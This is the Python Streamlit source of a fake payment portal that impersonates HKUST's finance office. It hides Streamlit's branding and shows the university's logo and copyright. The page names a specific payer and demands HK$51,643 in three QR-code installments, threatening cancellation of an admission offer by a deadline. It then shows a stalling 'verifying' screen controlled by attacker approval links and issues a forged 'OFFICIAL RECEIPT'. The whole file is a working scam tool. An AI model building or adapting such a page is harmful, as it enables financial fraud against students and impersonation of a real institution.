import streamlit as st
import base64
import os
import time
from datetime import datetime
import requests

# --- 1. 自動轉換圖片為網頁編碼的工具 ---
def get_base64_bin_file(bin_file):
    if os.path.exists(bin_file):
        with open(bin_file, 'rb') as f:
            data = f.read()
        return base64.b64encode(data).decode()
    return None

# --- 2. 頁面配置 ---
st.set_page_config(page_title="HKUST Deposit System", page_icon="✅", layout="wide")

# 讀取 Logo 編碼
logo_base64 = get_base64_bin_file("hkust.png")

# 注入強效 CSS 隱藏官方標誌並優化導航欄
st.markdown(f"""
<style>
#MainMenu, header, footer, .stDeployButton {{visibility: hidden !important;}}
[data-testid="stHeader"] {{display: none !important;}}

.nav-bar {{
    background-color: #003366;
    padding: 15px 60px;
    display: flex;
    align-items: center;
    color: white;
    border-bottom: 4px solid #A6937C;
    margin: -75px -100px 30px -100px;
}}
.nav-logo {{
    height: 50px;
    margin-right: 20px;
}}
.system-title {{
    border-left: 2px solid #fff;
    padding-left: 15px;
    font-size: 18px;
    font-weight: 500;
    line-height: 1.2;
}}
.payment-card {{ background: white; padding: 30px; border-radius: 10px; border: 1px solid #ddd; color: #000 !important; }}
.deadline-box {{ color: #d32f2f !important; font-weight: bold; font-size: 15px; background-color: #f8d7da !important; padding: 18px; border-radius: 4px; margin: 15px 0; border: 1px solid #f5c6cb; line-height: 1.5; }}
.info-box {{ background-color: #fffbe6; border: 1px solid #ffe58f; padding: 15px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; color: #856404; }}
</style>
""", unsafe_allow_html=True)

# --- 3. 數據與狀態管理 ---
STATUS_FILE = "payment_status.txt"
def set_status(s):
    with open(STATUS_FILE, "w") as f: f.write(s)
def get_status():
    if not os.path.exists(STATUS_FILE): return "pending"
    with open(STATUS_FILE, "r") as f: return f.read().strip()

# 處理管理員審核
if st.query_params.get("action") in ["approve1", "approve2", "approve3"]:
    set_status(st.query_params.get("action").replace("approve", "approved"))
    st.success("Action Confirmed!")
    st.stop()

PAYER = "XINGSHENG WANG (王兴生)"
HKD_TOTAL = "51,643"
USD_TOTAL = "6,593.21"

if 'step' not in st.session_state: st.session_state.step = "pay1"

# --- 4. 渲染導航欄 ---
logo_img_html = f'<img src="data:image/png;base64,{logo_base64}" class="nav-logo">' if logo_base64 else ""
st.markdown(f"""
<div class="nav-bar">
    {logo_img_html}
    <div class="system-title">
        Deposit System<br>
        <span style="font-size:12px; font-weight:normal;">Official Payment Portal</span>
    </div>
</div>
""", unsafe_allow_html=True)

# --- 5. 邏輯流程 ---

# Checking 動畫頁面
if st.session_state.step.startswith("checking"):
    stage = st.session_state.step[-1]
    st.markdown(f"""
    <div style="text-align:center; margin-top:100px;">
        <div style="border: 6px solid #f3f3f3; border-top: 6px solid #003366; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto;"></div>
        <style>@keyframes spin {{0% {{transform: rotate(0deg);}} 100% {{transform: rotate(360deg);}}}}</style>
        <h2 style="color:#003366;">Verifying Installment {stage}...</h2>
        <p>The Finance Office is verifying your transaction. Please stay on this page.</p>
    </div>
    """, unsafe_allow_html=True)
    time.sleep(5)
    if get_status() == f"approved{stage}":
        st.session_state.step = f"receipt{stage}"
    st.rerun()

# 階段 1: 支付 1200 USD
elif st.session_state.step == "pay1":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="payment-card">
<h3 style="color:#003366; margin-top:0;">Payment Plan Confirmation</h3>
<p style="color:#333;"><b>Payer Name:</b> {PAYER}</p>
<p>Your deposit of <b>HK$ {HKD_TOTAL}</b> (≈ <b>USD {USD_TOTAL}</b>) will be split into 3 installments.</p>
<div class="info-box"><b>Plan:</b> 1st: $1,200 | 2nd: $3,000 | 3rd: $2,393.21</div>
<div class="deadline-box">
⚠️ URGENT NOTICE:<br>
Please complete the payment by 4:00 PM on April 24th. Failure to do so will result in the immediate cancellation of your admission offer.
</div>
<p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Current Stage: 1st Installment - USD 1,200.00</p>
</div>""", unsafe_allow_html=True)
        # 請確保 GitHub 有 qr1.png
        st.image("qr1.png" if os.path.exists("qr1.png") else "https://placeholder.com", width=350)
        if st.button("I HAVE PAID THE 1ST INSTALLMENT", use_container_width=True, type="primary"):
            set_status("checking1"); st.session_state.step = "checking1"; st.rerun()

# 收據展示頁面 (以此類推)
elif st.session_state.step == "receipt3":
    st.markdown(f"""<div style="background:white; border:2px solid #003366; padding:40px; max-width:750px; margin:auto;"><h2 style="text-align:center; color:#003366;">OFFICIAL RECEIPT</h2><br><p><b>Payer:</b> {PAYER}</p><p><b>Total Amount:</b> HK$ {HKD_TOTAL}</p><div style="border:2px solid #d32f2f; color:#d32f2f; padding:8px; width:fit-content; transform:rotate(-5deg); font-weight:bold; margin-top:20px;">HKUST FINANCE OFFICE<br>FULL PAYMENT VERIFIED</div></div>""", unsafe_allow_html=True)
    st.balloons()

st.markdown("<p style='text-align:center; color:#999 !important; font-size:10px; margin-top:50px;'>© 2024 The Hong Kong University of Science and Technology. All rights reserved.</p>", unsafe_allow_html=True)
